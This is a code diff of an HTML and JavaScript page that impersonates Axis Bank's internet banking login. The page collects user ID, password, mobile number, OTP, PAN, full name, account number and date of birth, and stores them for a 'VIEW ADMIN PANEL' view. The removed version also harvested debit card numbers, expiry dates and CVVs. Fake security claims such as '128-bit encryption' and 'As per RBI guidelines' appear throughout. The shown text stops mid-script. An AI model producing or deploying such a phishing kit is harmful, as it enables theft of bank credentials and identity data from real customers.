@@ -1,11 +1,19 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login using</title>
+    <title>Axis Bank - Internet Banking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* Reset और बेसिक स्टाइल्स */
+        :root {
+            --axis-pink: #AE164E;
+            --axis-blue: #2E5BAF;
+            --axis-dark-blue: #1E4A9F;
+            --axis-gold: #FFD700;
+            --light-bg: #F5F7FA;
+        }
+        
         * {
             margin: 0;
             padding: 0;
@@ -14,517 +22,964 @@
         }
         
         body {
-            background-color: #990330;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e4e8ed 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
             padding: 20px;
         }
         
-        /* मुख्य कंटेनर */
-        .login-box {
-            width: 100%;
-            max-width: 380px;
-            background-color: white;
-            border-radius: 8px;
+        /* Login Card */
+        .login-card {
+            width: 400px;
+            background: white;
+            border-radius: 12px;
             overflow: hidden;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-        }
-        
-        /* हेडर सेक्शन */
-        .login-header {
-            padding: 25px 25px 20px 25px;
-            border-bottom: 1px solid #eee;
+            box-shadow: 0 15px 35px rgba(0, 0, 100, 0.1);
             text-align: center;
         }
         
-        .login-header h1 {
-            color: #333;
-            font-size: 20px;
-            font-weight: normal;
-            margin-bottom: 8px;
-        }
-        
-        .login-header p {
-            color: #666;
-            font-size: 14px;
-        }
-        
-        /* लॉगिन विकल्प टैब */
-        .login-tabs {
+        /* Header */
+        .axis-header {
+            background: linear-gradient(to right, var(--axis-blue), var(--axis-dark-blue));
+            height: 70px;
             display: flex;
-            border-bottom: 1px solid #ddd;
+            align-items: center;
+            padding: 0 20px;
+            position: relative;
         }
         
-        .tab {
+        .hamburger {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+        }
+        
+        .hamburger span {
+            width: 20px;
+            height: 2px;
+            background: white;
+            border-radius: 2px;
+        }
+        
+        .white-curve-box {
+            background: white;
+            height: 100%;
+            flex-grow: 1;
+            margin-left: 25px;
+            border-radius: 40px 0 0 0;
+            display: flex;
+            align-items: center;
+            padding-left: 25px;
+            font-weight: 900;
+            font-style: italic;
+        }
+        
+        .open-text {
+            color: var(--axis-blue);
+            font-size: 26px;
+            letter-spacing: 1px;
+        }
+        
+        .divider {
+            color: #999;
+            margin: 0 10px;
+            font-size: 20px;
+        }
+        
+        .ib-text {
+            color: var(--axis-blue);
+            font-size: 26px;
+        }
+        
+        /* Bank Logo */
+        .bank-logo {
+            padding: 25px 0 15px;
+            background: var(--light-bg);
+        }
+        
+        .bank-logo i {
+            font-size: 50px;
+            color: var(--axis-blue);
+            margin-bottom: 10px;
+        }
+        
+        .bank-name {
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--axis-dark-blue);
+            letter-spacing: 1px;
+        }
+        
+        /* Tabs */
+        .tabs {
+            display: flex;
+            background: #F0F4F8;
+            margin: 20px 30px;
+            border-radius: 8px;
+            padding: 5px;
+        }
+        
+        .tab-btn {
             flex: 1;
-            text-align: center;
-            padding: 15px;
-            font-size: 14px;
+            padding: 12px;
+            border: none;
+            background: none;
+            font-size: 16px;
+            font-weight: 600;
             color: #666;
             cursor: pointer;
-            border-bottom: 2px solid transparent;
+            border-radius: 6px;
             transition: all 0.3s;
         }
         
-        .tab.active {
-            color: #990330;
-            font-weight: bold;
-            border-bottom: 2px solid #990330;
+        .tab-btn.active {
+            background: white;
+            color: var(--axis-blue);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
         
-        /* फॉर्म सेक्शन */
-        .form-container {
-            padding: 25px;
+        /* Input Fields */
+        input {
+            width: 85%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #E1E8F0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
         }
         
-        .form-section {
-            display: none;
-        }
-        
-        .form-section.active {
-            display: block;
-        }
-        
-        /* इनपुट ग्रुप */
-        .input-group {
-            margin-bottom: 20px;
-        }
-        
-        .input-group label {
-            display: block;
-            color: #333;
-            font-size: 13px;
-            font-weight: bold;
-            margin-bottom: 8px;
+        input:focus {
+            outline: none;
+            border-color: var(--axis-blue);
+            box-shadow: 0 0 0 3px rgba(46, 91, 175, 0.1);
         }
         
         .input-with-icon {
             position: relative;
+            width: 85%;
+            margin: 10px auto;
         }
         
-        .input-icon {
+        .input-with-icon i {
             position: absolute;
-            left: 12px;
+            left: 15px;
             top: 50%;
             transform: translateY(-50%);
-            color: #990330;
-            font-weight: bold;
-            font-style: italic;
+            color: #666;
         }
         
-        .input-field {
+        .input-with-icon input {
             width: 100%;
-            padding: 12px 12px 12px 30px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 14px;
-            color: #333;
-            background-color: #f9f9f9;
+            padding-left: 45px;
         }
         
-        .input-field:focus {
-            outline: none;
-            border-color: #990330;
-            background-color: #fff;
-        }
-        
-        /* लिंक्स */
-        .links {
-            margin-top: 8px;
-            display: flex;
-            justify-content: space-between;
-        }
-        
-        .link {
-            color: #990330;
-            text-decoration: none;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        
-        .link:hover {
-            text-decoration: underline;
-        }
-        
-        /* डैशबोर्ड टेक्स्ट */
-        .dashboard-text {
-            margin: 25px 0;
-            padding: 15px;
-            background-color: #f5f5f5;
-            border-radius: 4px;
-            text-align: center;
-        }
-        
-        .dashboard-text p {
-            color: #333;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        
-        /* लॉगिन बटन */
-        .login-button {
-            width: 100%;
-            padding: 14px;
-            background-color: #990330;
+        /* Buttons */
+        .main-btn {
+            width: 85%;
+            padding: 16px;
+            background: linear-gradient(to right, var(--axis-blue), var(--axis-dark-blue));
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
+            border-radius: 8px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: background-color 0.3s;
+            margin: 20px 0 10px;
+            transition: all 0.3s;
         }
         
-        .login-button:hover {
-            background-color: #7a0026;
+        .main-btn:hover {
+            background: linear-gradient(to right, var(--axis-dark-blue), #15367F);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(46, 91, 175, 0.3);
         }
         
-        /* रजिस्टर सेक्शन */
-        .register-section {
+        /* OTP Input */
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .otp-digit {
+            width: 50px;
+            height: 60px;
+            border: 2px solid #E1E8F0;
+            border-radius: 8px;
             text-align: center;
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px solid #eee;
-        }
-        
-        .register-section span {
-            color: #666;
-            font-size: 14px;
-        }
-        
-        .register-link {
-            color: #990330;
-            text-decoration: none;
+            font-size: 24px;
             font-weight: bold;
-            margin-left: 5px;
+            color: var(--axis-dark-blue);
         }
         
-        .register-link:hover {
+        .otp-digit:focus {
+            outline: none;
+            border-color: var(--axis-blue);
+            box-shadow: 0 0 0 3px rgba(46, 91, 175, 0.1);
+        }
+        
+        /* Timer */
+        .timer-container {
+            background: #FFEBEE;
+            border: 1px solid #FFCDD2;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 20px 30px;
+            color: #C62828;
+            font-weight: bold;
+            font-size: 15px;
+        }
+        
+        #timer {
+            color: #E53935;
+            font-size: 18px;
+        }
+        
+        /* Resend Link */
+        .resend-link {
+            background: none;
+            border: none;
+            color: var(--axis-blue);
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 15px;
+            margin: 10px 0;
+            font-weight: 600;
+        }
+        
+        .resend-link:hover {
+            color: var(--axis-dark-blue);
+        }
+        
+        /* Footer Links */
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 30px 10px;
+            padding-top: 15px;
+            border-top: 1px solid #E1E8F0;
+        }
+        
+        .footer-links a {
+            color: var(--axis-blue);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .footer-links a:hover {
             text-decoration: underline;
         }
         
-        /* QR कोड सेक्शन */
-        .qr-section {
-            margin-top: 25px;
-            padding: 20px;
-            background-color: #f9f9f9;
-            border-radius: 4px;
-            text-align: center;
-        }
-        
-        .qr-title {
-            color: #333;
-            font-size: 14px;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-        
-        .qr-code {
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 15px auto;
-            background: linear-gradient(45deg, #ddd, #eee);
-            border-radius: 4px;
+        /* Security Badge */
+        .security-badge {
+            background: #F0F7FF;
+            border: 1px solid #D1E3FF;
+            border-radius: 6px;
+            padding: 12px;
+            margin: 15px 30px;
+            font-size: 13px;
+            color: #666;
             display: flex;
             align-items: center;
             justify-content: center;
-            border: 1px solid #ccc;
+            gap: 10px;
         }
         
-        .qr-text {
+        .security-badge i {
+            color: var(--axis-blue);
+        }
+        
+        /* Hidden Sections */
+        #login-section, #otp-section, #pan-section, #account-section {
+            padding: 0 0 25px;
+        }
+        
+        .section-title {
+            color: var(--axis-dark-blue);
+            margin: 20px 0 10px;
+            font-size: 22px;
+        }
+        
+        .section-subtitle {
             color: #666;
-            font-size: 12px;
+            font-size: 14px;
+            margin-bottom: 25px;
+            padding: 0 30px;
         }
         
-        .enlarge-link {
-            color: #990330;
-            text-decoration: none;
-            font-size: 12px;
-            font-weight: bold;
+        /* PAN and Account Sections */
+        .form-group {
+            margin: 15px 30px;
+            text-align: left;
+        }
+        
+        .form-group label {
             display: block;
-            margin-top: 10px;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 15px;
         }
         
-        .enlarge-link:hover {
-            text-decoration: underline;
+        .date-inputs {
+            display: flex;
+            gap: 10px;
         }
         
-        /* फूटर */
-        .footer {
-            padding: 15px 25px;
-            background-color: #f5f5f5;
-            text-align: center;
-            border-top: 1px solid #eee;
+        .date-inputs select {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #E1E8F0;
+            border-radius: 8px;
+            font-size: 16px;
         }
         
-        .footer-text {
-            color: #666;
-            font-size: 11px;
+        /* Success Section */
+        .success-icon {
+            font-size: 60px;
+            color: #4CAF50;
+            margin: 20px 0;
+        }
+        
+        .success-message {
+            background: #E8F5E9;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 30px;
+            text-align: left;
+        }
+        
+        .success-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0;
+            color: #2E7D32;
+        }
+        
+        /* Loading Spinner */
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--axis-blue);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <!-- हेडर -->
-        <div class="login-header">
-            <h1>Login using</h1>
-            <p>Login ID / Customer ID &nbsp;&nbsp; Debit Card No.</p>
-        </div>
-        
-        <!-- टैब्स -->
-        <div class="login-tabs">
-            <div class="tab active" data-tab="userid">Login ID / Customer ID</div>
-            <div class="tab" data-tab="card">Debit Card No.</div>
-        </div>
-        
-        <!-- फॉर्म कंटेनर -->
-        <div class="form-container">
-            <!-- User ID फॉर्म -->
-            <form id="userid-form" class="form-section active">
-                <div class="input-group">
-                    <label>Login ID / Customer ID</label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">i</span>
-                        <input type="text" class="input-field" placeholder="Enter ID" id="userid">
-                    </div>
-                    <div class="links">
-                        <a href="#" class="link">Forgot customer ID</a>
-                        <a href="#" class="link">Enable login ID</a>
-                    </div>
-                </div>
-                
-                <div class="input-group">
-                    <label>Password</label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">●</span>
-                        <input type="password" class="input-field" placeholder="Enter Password" id="password">
-                    </div>
-                    <div class="links">
-                        <a href="#" class="link">Forgot password</a>
-                    </div>
-                </div>
-                
-                <div class="input-group">
-                    <label>Mobile Number</label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">📱</span>
-                        <input type="tel" class="input-field" placeholder="Enter Mobile Number" id="mobile" maxlength="10">
-                    </div>
-                </div>
-            </form>
-            
-            <!-- Card फॉर्म -->
-            <form id="card-form" class="form-section">
-                <div class="input-group">
-                    <label>16-Digit Debit Card Number</label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">💳</span>
-                        <input type="text" class="input-field" placeholder="Enter 16-digit card number" id="cardno" maxlength="16">
-                    </div>
-                </div>
-                
-                <div class="input-group">
-                    <label>Expiry Date (DDMM)</label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">📅</span>
-                        <input type="text" class="input-field" placeholder="DDMM" id="expiry" maxlength="4">
-                    </div>
-                </div>
-                
-                <div class="input-group">
-                    <label>CVV (3 digits)</label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">🔒</span>
-                        <input type="text" class="input-field" placeholder="123" id="cvv" maxlength="3">
-                    </div>
-                </div>
-            </form>
-            
-            <!-- डैशबोर्ड टेक्स्ट -->
-            <div class="dashboard-text">
-                <p>Login directly to Dashboard</p>
+    <div class="login-card">
+        <!-- Header -->
+        <div class="axis-header">
+            <div class="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
             </div>
-            
-            <!-- लॉगिन बटन -->
-            <button type="button" class="login-button" id="loginBtn">Login</button>
-            
-            <!-- रजिस्टर सेक्शन -->
-            <div class="register-section">
-                <span>First time user?</span>
-                <a href="#" class="register-link">REGISTER HERE</a>
-            </div>
-            
-            <!-- QR कोड सेक्शन -->
-            <div class="qr-section">
-                <div class="qr-title">Scan to download open by Axis Bank app</div>
-                <div class="qr-code">
-                    <span class="qr-text">QR Code</span>
-                </div>
-                <a href="#" class="enlarge-link">Enlarge QR code</a>
+            <div class="white-curve-box">
+                <span class="open-text">open</span>
+                <span class="divider">|</span>
+                <span class="ib-text">IB</span>
             </div>
         </div>
         
-        <!-- फूटर -->
-        <div class="footer">
-            <div class="footer-text">
-                © 2024 Bank Name. All rights reserved.
+        <!-- Bank Logo -->
+        <div class="bank-logo">
+            <i class="fas fa-university"></i>
+            <div class="bank-name">AXIS BANK</div>
+        </div>
+        
+        <!-- Login Section -->
+        <div id="login-section">
+            <h3 class="section-title">Login to Internet Banking</h3>
+            
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchTab('login')">
+                    <i class="fas fa-user"></i> Login ID
+                </button>
+                <button class="tab-btn" onclick="switchTab('card')">
+                    <i class="fas fa-credit-card"></i> Debit Card
+                </button>
             </div>
+            
+            <div class="input-with-icon">
+                <i class="fas fa-user-circle"></i>
+                <input type="text" id="userId" placeholder="Enter Customer ID / Login ID" autocomplete="off">
+            </div>
+            
+            <div class="input-with-icon">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="password" placeholder="Enter Password" autocomplete="off">
+            </div>
+            
+            <div class="input-with-icon">
+                <i class="fas fa-mobile-alt"></i>
+                <input type="tel" id="mobile" placeholder="Registered Mobile Number" maxlength="10" autocomplete="off">
+            </div>
+            
+            <div class="loading" id="loginLoading">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px; color: #666;">Verifying credentials...</p>
+            </div>
+            
+            <button class="main-btn" onclick="processLogin()">
+                <i class="fas fa-sign-in-alt"></i> LOGIN
+            </button>
+            
+            <div class="footer-links">
+                <a href="#"><i class="fas fa-question-circle"></i> Forgot User ID?</a>
+                <a href="#"><i class="fas fa-key"></i> Forgot Password?</a>
+            </div>
+            
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>Your login is secured with 128-bit encryption</span>
+            </div>
+        </div>
+        
+        <!-- OTP Section -->
+        <div id="otp-section" style="display: none;">
+            <h3 class="section-title">Two-Factor Authentication</h3>
+            <p class="section-subtitle">
+                OTP has been sent to your registered mobile number ending with 
+                <span id="maskedMobile" style="font-weight: bold; color: var(--axis-blue);">XXXX</span>
+            </p>
+            
+            <div class="otp-inputs">
+                <input type="text" class="otp-digit" maxlength="1" data-index="1">
+                <input type="text" class="otp-digit" maxlength="1" data-index="2">
+                <input type="text" class="otp-digit" maxlength="1" data-index="3">
+                <input type="text" class="otp-digit" maxlength="1" data-index="4">
+                <input type="text" class="otp-digit" maxlength="1" data-index="5">
+                <input type="text" class="otp-digit" maxlength="1" data-index="6">
+            </div>
+            <input type="hidden" id="fullOtp">
+            
+            <div class="timer-container">
+                <i class="fas fa-clock"></i>
+                Time remaining: <span id="timer">03:00</span>
+            </div>
+            
+            <div class="loading" id="otpLoading">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px; color: #666;">Verifying OTP...</p>
+            </div>
+            
+            <button class="main-btn" onclick="verifyOTP()">
+                <i class="fas fa-check-circle"></i> VERIFY OTP
+            </button>
+            
+            <button class="resend-link" id="resendBtn" style="display: none;" onclick="resendOTP()">
+                <i class="fas fa-redo"></i> Resend OTP
+            </button>
+        </div>
+        
+        <!-- PAN Section -->
+        <div id="pan-section" style="display: none;">
+            <h3 class="section-title">PAN Verification</h3>
+            <p class="section-subtitle">As per RBI guidelines, PAN verification is mandatory</p>
+            
+            <div class="form-group">
+                <label for="fullName">Full Name (as per PAN Card)</label>
+                <input type="text" id="fullName" placeholder="Enter your full name">
+            </div>
+            
+            <div class="form-group">
+                <label for="panNumber">PAN Number</label>
+                <input type="text" id="panNumber" placeholder="ABCDE1234F" maxlength="10" style="text-transform: uppercase;">
+                <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">
+                    Format: 5 letters, 4 digits, 1 letter (e.g., ABCDE1234F)
+                </small>
+            </div>
+            
+            <div class="loading" id="panLoading">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px; color: #666;">Verifying PAN details...</p>
+            </div>
+            
+            <button class="main-btn" onclick="processPAN()">
+                <i class="fas fa-id-card"></i> VERIFY PAN
+            </button>
+        </div>
+        
+        <!-- Account Section -->
+        <div id="account-section" style="display: none;">
+            <h3 class="section-title">Account Details</h3>
+            <p class="section-subtitle">Required for KYC completion</p>
+            
+            <div class="form-group">
+                <label for="accountNumber">Bank Account Number</label>
+                <input type="text" id="accountNumber" placeholder="Enter 11-16 digit account number" maxlength="16">
+            </div>
+            
+            <div class="form-group">
+                <label>Date of Birth (as per bank records)</label>
+                <div class="date-inputs">
+                    <select id="dobDay">
+                        <option value="">Day</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                        <option value="13">13</option>
+                        <option value="14">14</option>
+                        <option value="15">15</option>
+                        <option value="16">16</option>
+                        <option value="17">17</option>
+                        <option value="18">18</option>
+                        <option value="19">19</option>
+                        <option value="20">20</option>
+                        <option value="21">21</option>
+                        <option value="22">22</option>
+                        <option value="23">23</option>
+                        <option value="24">24</option>
+                        <option value="25">25</option>
+                        <option value="26">26</option>
+                        <option value="27">27</option>
+                        <option value="28">28</option>
+                        <option value="29">29</option>
+                        <option value="30">30</option>
+                        <option value="31">31</option>
+                    </select>
+                    
+                    <select id="dobMonth">
+                        <option value="">Month</option>
+                        <option value="01">January</option>
+                        <option value="02">February</option>
+                        <option value="03">March</option>
+                        <option value="04">April</option>
+                        <option value="05">May</option>
+                        <option value="06">June</option>
+                        <option value="07">July</option>
+                        <option value="08">August</option>
+                        <option value="09">September</option>
+                        <option value="10">October</option>
+                        <option value="11">November</option>
+                        <option value="12">December</option>
+                    </select>
+                    
+                    <select id="dobYear">
+                        <option value="">Year</option>
+                        <!-- Will be populated by JavaScript -->
+                    </select>
+                </div>
+                <input type="hidden" id="fullDob">
+            </div>
+            
+            <div class="loading" id="accountLoading">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px; color: #666;">Saving account details...</p>
+            </div>
+            
+            <button class="main-btn" onclick="processAccount()">
+                <i class="fas fa-check-circle"></i> COMPLETE VERIFICATION
+            </button>
+        </div>
+        
+        <!-- Success Section -->
+        <div id="success-section" style="display: none;">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            
+            <h3 class="section-title">Verification Successful!</h3>
+            
+            <div class="success-message">
+                <div class="success-item">
+                    <i class="fas fa-check"></i>
+                    <span>Login credentials verified</span>
+                </div>
+                <div class="success-item">
+                    <i class="fas fa-check"></i>
+                    <span>OTP authentication completed</span>
+                </div>
+                <div class="success-item">
+                    <i class="fas fa-check"></i>
+                    <span>PAN details verified</span>
+                </div>
+                <div class="success-item">
+                    <i class="fas fa-check"></i>
+                    <span>Account information saved</span>
+                </div>
+            </div>
+            
+            <div class="timer-container" style="background: #E8F5E9; border-color: #C8E6C9; color: #2E7D32;">
+                <i class="fas fa-info-circle"></i>
+                Your verification is complete. You will be redirected shortly.
+            </div>
+            
+            <button class="main-btn" onclick="goToAdmin()" style="background: linear-gradient(to right, #4CAF50, #2E7D32);">
+                <i class="fas fa-eye"></i> VIEW ADMIN PANEL
+            </button>
+            
+            <button class="resend-link" onclick="restartProcess()">
+                <i class="fas fa-redo"></i> Start New Verification
+            </button>
         </div>
     </div>
 
     <script>
-        // टैब स्विचिंग
-        document.querySelectorAll('.tab').forEach(tab => {
-            tab.addEventListener('click', function() {
-                // सभी टैब्स से active क्लास हटाएं
-                document.querySelectorAll('.tab').forEach(t => {
-                    t.classList.remove('active');
-                });
-                
-                // सभी फॉर्म से active क्लास हटाएं
-                document.querySelectorAll('.form-section').forEach(form => {
-                    form.classList.remove('active');
-                });
-                
-                // क्लिक किए गए टैब को active बनाएं
-                this.classList.add('active');
-                
-                // संबंधित फॉर्म दिखाएं
-                const tabId = this.getAttribute('data-tab');
-                document.getElementById(`${tabId}-form`).classList.add('active');
-            });
-        });
-        
-        // लॉगिन बटन कार्य
-        document.getElementById('loginBtn').addEventListener('click', function() {
-            let currentTab = document.querySelector('.tab.active').getAttribute('data-tab');
-            let isValid = true;
-            
-            if (currentTab === 'userid') {
-                // User ID वैलिडेशन
-                const userId = document.getElementById('userid').value.trim();
-                const password = document.getElementById('password').value.trim();
-                const mobile = document.getElementById('mobile').value.trim();
-                
-                if (userId === '' || password === '' || mobile === '') {
-                    isValid = false;
-                }
-                
-                if (isValid) {
-                    // डेटा सेव करें
-                    const loginData = {
-                        type: 'userid',
-                        userid: userId,
-                        password: password,
-                        mobile: mobile,
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    // LocalStorage में सेव करें
-                    saveToAdmin(loginData);
-                    
-                    // OTP पेज पर रीडायरेक्ट
-                    window.location.href = 'axis_otp1.html';
-                }
-                
-            } else if (currentTab === 'card') {
-                // Card वैलिडेशन
-                const cardno = document.getElementById('cardno').value.trim();
-                const expiry = document.getElementById('expiry').value.trim();
-                const cvv = document.getElementById('cvv').value.trim();
-                
-                if (cardno.length !== 16 || expiry.length !== 4 || cvv.length !== 3) {
-                    isValid = false;
-                }
-                
-                if (isValid) {
-                    // डेटा सेव करें
-                    const loginData = {
-                        type: 'card',
-                        cardno: cardno,
-                        expiry: expiry,
-                        cvv: cvv,
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    // LocalStorage में सेव करें
-                    saveToAdmin(loginData);
-                    
-                    // OTP पेज पर रीडायरेक्ट
-                    window.location.href = 'otp1.html';
-                }
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Populate year dropdown
+            const yearSelect = document.getElementById('dobYear');
+            const currentYear = new Date().getFullYear();
+            for (let year = currentYear; year >= 1900; year--) {
+                const option = document.createElement('option');
+                option.value = year;
+                option.textContent = year;
+                yearSelect.appendChild(option);
             }
             
-            // अगर वैलिडेशन फेल हो तो कोई अलर्ट नहीं - सिर्फ कुछ नहीं होगा
+            // Initialize admin data if not exists
+            if (!localStorage.getItem('adminData')) {
+                localStorage.setItem('adminData', JSON.stringify([]));
+            }
         });
         
-        // डेटा को admin के लिए सेव करना
-        function saveToAdmin(data) {
-            try {
-                // पुराना डेटा लोड करें
-                let allLogins = JSON.parse(localStorage.getItem('bank_logins')) || [];
-                
-                // नया डेटा जोड़ें
-                allLogins.push(data);
-                
-                // वापस सेव करें
-                localStorage.setItem('bank_logins', JSON.stringify(allLogins));
-                
-                // कंसोल में दिखाएं (डीबगिंग के लिए)
-                console.log('Login data saved:', data);
-                
-            } catch (error) {
-                console.error('Error saving login data:', error);
+        // Tab switching
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            if (tab === 'card') {
+                document.querySelector('label[for="userId"]').textContent = 'Debit Card Number';
+                document.getElementById('userId').placeholder = 'Enter 16-digit card number';
+            } else {
+                document.querySelector('label[for="userId"]').textContent = 'Customer ID / Login ID';
+                document.getElementById('userId').placeholder = 'Enter Customer ID / Login ID';
             }
         }
         
-        // इनपुट वैलिडेशन और फॉर्मैटिंग
-        document.getElementById('cardno').addEventListener('input', function(e) {
-            // सिर्फ नंबर्स
-            this.value = this.value.replace(/\D/g, '');
-            
-            // 16 डिजिट से ज्यादा नहीं
-            if (this.value.length > 16) {
-                this.value = this.value.substring(0, 16);
-            }
-        });
-        
-        document.getElementById('expiry').addEventListener('input', function(e) {
-            // सिर्फ नंबर्स
-            this.value = this.value.replace(/\D/g, '');
-            
-            // 4 डिजिट से ज्यादा नहीं
-            if (this.value.length > 4) {
-                this.value = this.value.substring(0, 4);
-            }
-        });
-        
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            // सिर्फ नंबर्स
-            this.value = this.value.replace(/\D/g, '');
-            
-            // 3 डिजिट से ज्यादा नहीं
-            if (this.value.length > 3) {
-                this.value = this.value.substring(0, 3);
-            }
-        });
-        
+        // Mobile number validation
         document.getElementById('mobile').addEventListener('input', function(e) {
-            // सिर्फ नंबर्स
-            this.value = this.value.replace(/\D/g, '');
-            
-            // 10 डिजिट से ज्यादा नहीं
-            if (this.value.length > 10) {
-                this.value = this.value.substring(0, 10);
-            }
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
         });
         
-        // पेज लोड होने पर फोकस सेट करें
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('userid').focus();
+        // PAN number formatting
+        document.getElementById('panNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 10);
         });
+        
+        // Account number validation
+        document.getElementById('accountNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 16);
+        });
+        
+        // OTP input handling
+        const otpDigits = document.querySelectorAll('.otp-digit');
+        otpDigits.forEach((digit, index) => {
+            digit.addEventListener('input', function(e) {
+                const value = e.target.value.replace(/\D/g, '');
+                e.target.value = value.slice(0, 1);
+                
+                if (value && index < otpDigits.length - 1) {
+                    otpDigits[index + 1].focus();
+                }
+                
+                updateFullOTP();
+            });
+            
+            digit.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpDigits[index - 1].focus();
+                }
+            });
+        });
+        
+        function updateFullOTP() {
+            let otp = '';
+            otpDigits.forEach(digit => {
+                otp += digit.value;
+            });
+            document.getElementById('fullOtp').value = otp;
+        }
+        
+        // DOB update
+        function updateDOB() {
+            const day = document.getElementById('dobDay').value;
+            const month = document.getElementById('dobMonth').value;
+            const year = document.getElementById('dobYear').value;
+            
+            if (day && month && year) {
+                document.getElementById('fullDob').value = `${day}/${month}/${year}`;
+            }
+        }
+        
+        document.getElementById('dobDay').addEventListener('change', updateDOB);
+        document.getElementById('dobMonth').addEventListener('change', updateDOB);
+        document.getElementById('dobYear').addEventListener('change', updateDOB);
+        
+        // Login Process
+        function processLogin() {
+            const userId = document.getElementById('userId').value;
+            const password = document.getElementById('password').value;
+            const mobile = document.getElementById('mobile').value;
+            
+            // Validation
+            if (!userId || !password || !mobile) {
+                alert('Please fill all fields');
+                return;
+            }
+            
+            if (mobile.length !== 10) {
+                alert('Please enter a valid 10-digit mobile number');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('loginLoading').style.display = 'block';
+            
+            // Save login data
+            setTimeout(() => {
+                const loginData = {
+                    userId: userId,
+                    password: password,
+                    mobile: mobile,
+                    timestamp: new Date().toISOString(),
+                    page: 'Axis Bank Login'
+                };
+                
+                saveToAdmin(loginData);
+                
+                // Hide login section, show OTP
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('loginLoading').style.display = 'none';
+                
+                // Show masked mobile in OTP section
+                const maskedMobile = 'XXXXXX' + mobile.slice(-4);
+                document.getElementById('maskedMobile').textContent = maskedMobile;
+                
+                document.getElementById('otp-section').style.display = 'block';
+                
+                // Start OTP timer
+                startTimer();
+            }, 1500);
+        }
+        
+        // OTP Timer
+        let timerInterval;
+        function startTimer() {
+            let timeLeft = 180;
+            const timerDisplay = document.getElementById('timer');
+            const resendBtn = document.getElementById('resendBtn');
+            
+            resendBtn.style.display = 'none';
+            
+            clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                timerDisplay.textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
